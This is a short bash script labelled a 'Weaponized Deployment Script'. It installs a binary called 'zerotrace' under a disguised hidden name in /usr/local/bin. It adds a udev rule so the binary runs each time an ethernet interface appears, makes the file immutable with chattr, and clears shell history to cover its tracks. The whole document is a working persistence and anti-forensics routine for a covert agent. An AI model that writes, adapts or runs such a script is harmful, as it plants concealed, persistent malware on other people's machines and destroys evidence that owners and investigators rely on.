#!/bin/bash
# Weaponized Deployment Script
BIN_PATH="./target/release/zerotrace"
INSTALL_DEST="/usr/local/bin/.sys_vfs_cache"

echo "[*] Deploying Agent..."
cp $BIN_PATH $INSTALL_DEST
chmod +x $INSTALL_DEST

# Persistence via UDEV Network Trigger
echo 'SUBSYSTEM=="net", ACTION=="add", KERNEL=="eth*", RUN+="'$INSTALL_DEST'"' > /etc/udev/rules.d/10-local.rules

# Hide from Disk listing (Immutable)
chattr +i $INSTALL_DEST

# Clean logs
history -c
echo "[*] Agent Active and Persistent."
